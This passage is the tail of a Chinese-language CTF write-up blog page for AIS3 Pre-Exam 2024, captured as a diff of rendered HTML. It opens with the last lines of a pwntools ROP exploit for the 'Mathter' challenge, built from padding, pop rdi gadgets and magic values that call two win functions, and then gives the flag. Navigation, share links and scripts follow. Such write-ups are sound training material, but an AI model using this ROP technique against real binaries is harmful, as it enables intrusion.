+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> flat([<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#ff79c6">*</span> pad, pop_rdi,<span style="color:#bd93f9">0xDEADBEEF</span>,win1,pop_rdi,<span style="color:#bd93f9">0xCAFEBABE</span>,win2]) 
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 兩個要檢查的數字是 0xDEADBEEF 跟 0xCAFEBABE，pop rdi 會把 rdi 設成 stack top 的值</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;[Y/n]&#39;</span>, payload);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/ctf/ais3_pre_exam_2024/mathter_6.png" alt="image"></p>
+<h4 id="flag-8">FLAG:</h4>
+<p>AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">主頁</a></li>
+         
+          <li><a href="/posts">廢文區</a></li>
+         
+          <li><a href="/resources">資源</a></li>
+         
+          <li><a href="/tags">標籤</a></li>
+         
+          <li><a href="/comment">留言區</a></li>
+         
+          <li><a href="/about">關於本人</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#心得">心得</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#welcome">Welcome</a>
+          <ul>
+            <li><a href="#flag">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#quantum-nim-heist">Quantum Nim Heist</a>
+          <ul>
+            <li><a href="#flag-1">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#three-dimensional-secret">Three Dimensional Secret</a>
+          <ul>
+            <li><a href="#flag-2">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#emoji-console">Emoji Console</a>
+          <ul>
+            <li><a href="#flag-3">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#evil-calculator">Evil Calculator</a>
+          <ul>
+            <li><a href="#flag-4">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#capoost">Capoost</a>
+          <ul>
+            <li><a href="#flag-5">FLAG:</a></li>
+          </ul>
+        </li>
+        <li><a href="#its-mygo">It&rsquo;s MyGO!!!!</a>
+          <ul>
+            <li><a href="#flag-6">FLAG：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#rev">Rev</a>
+      <ul>
+        <li><a href="#the-long-print">The Long Print</a>
+          <ul>
+            <li><a href="#flag-7">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#mathter">Mathter</a>
+          <ul>
+            <li><a href="#flag-8">FLAG:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&text=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&is_video=false&description=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024&body=Check out this article: %2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&title=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&name=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024&description=AIS3%20Pre-Exam%202024%20%e5%85%88%e6%94%be%e7%b5%90%e6%9e%9c%0aMy%20First%20CTF%ef%bc%9a%e6%bd%9b%e5%8a%9b%e7%8d%8e%0a%e5%bf%83%e5%be%97%20%e7%ac%ac%e4%b8%80%e6%ac%a1%e5%8f%83%e5%8a%a0%20My%20First%20CTF%20%e8%b7%9f%20AIS3%20Pre-Exam%ef%bc%8c%e6%9c%80%e5%be%8c%e6%9c%89%e5%b9%be%e9%a1%8c%e5%88%b0%e6%af%94%e8%b3%bd%e7%b5%90%e6%9d%9f%e6%89%8d%e8%a7%a3%e5%87%ba%e4%be%86%ef%bc%8c%e8%a6%ba%e5%be%97%e6%bb%bf%e5%8f%af%e6%83%9c%e7%9a%84%ef%bc%8c%0a%e5%b8%8c%e6%9c%9b%e4%b8%8b%e6%ac%a1%e8%83%bd%e9%80%9a%e9%9d%88%e5%87%ba%e6%9b%b4%e5%a4%9a%e9%a1%8c%e7%9b%ae%e3%80%82%0aWrite%20Up%20Misc%20Welcome%20%e7%b0%bd%e5%88%b0%e9%a1%8c%0aFLAG%3a%20AIS3%7bWelc0me_to_AIS3_PreExam_2o24%21%7d%0aQuantum%20Nim%20Heist%20Welcome%20to%20the%20Quantum%20Nim%20Heist%2c%20where%20traditional%20logic%20intertwines%20with%20the%20enigmatic%20realm%20of%20quantum%20mechanics%20to%20create%20a%20Nim%20game%20like%20no%20other.%20%e8%b7%9f%e9%9b%bb%e8%85%a6%e7%8e%a9%20Nim%20%e9%81%8a%e6%88%b2%ef%bc%8cWiki%20-%20Nim%ef%bc%8c%0a%e9%80%99%e8%a3%a1%e7%9a%84%e8%a6%8f%e5%89%87%e6%98%af%e6%8b%bf%e8%b5%b0%e6%9c%80%e5%be%8c%e4%b8%80%e6%a3%b5%e7%9f%b3%e9%a0%ad%e7%9a%84%e4%ba%ba%e7%8d%b2%e5%8b%9d%ef%bc%8c%e8%80%8c%e6%a0%b9%e6%93%9a%e7%b5%84%e5%90%88%e8%b3%bd%e5%b1%80%e7%90%86%e8%ab%96%ef%bc%8c%e6%8a%8a%e6%af%8f%e5%a0%86%e7%9f%b3%e9%a0%ad%e6%95%b8%20XOR%20%e5%be%8c%e8%8b%a5%e7%82%ba%200%20%e5%89%87%e5%be%8c%e6%89%8b%e5%bf%85%e5%8b%9d%ef%bc%8c%e5%90%a6%e5%89%87%e5%85%88%e6%89%8b%e5%bf%85%e5%8b%9d%e3%80%82%0a%e7%9c%8b%e5%88%b0%20server.py%0a1%202%203%204%205%206%207%208%209%2010%2011%2012%2013%2014%2015%2016%2017%2018%2019%2020%2021%2022%2023%2024%2025%20def%20menu%28%29%3a%20print_main_menu%28%29%20choice%20%3d%20input%28%26%2339%3bwhat%20would%20you%20like%20to%20do%3f" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2f%2flocalhost%3a1313%2fposts%2f2024%2fais3_pre_exam_2024%2f&t=%e3%80%90CTF-WriteUp%e3%80%91AIS3%20Pre-Exam%202024" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2024  ErrorPro 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">主頁</a></li>
+         
+        <li><a href="/posts">廢文區</a></li>
+         
+        <li><a href="/resources">資源</a></li>
+         
+        <li><a href="/tags">標籤</a></li>
+         
+        <li><a href="/comment">留言區</a></li>
+         
+        <li><a href="/about">關於本人</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+  
+
+
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$'], ['\\(', '\\)']]
+    },
+    svg: {
+      fontCache: 'global'
+    }
+  };
+</script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+
+<script type="text/javascript" src=/js/nest.js count=150 color="255,255,255" opacity=1>
+</script>
+
+<img id="Cursor" src="/images/cursor/silverwolf/01-Normal.gif">
+
+<script type="text/javascript" src=/js/cursor.js>
+</script>
+
+
+
+
+</html>
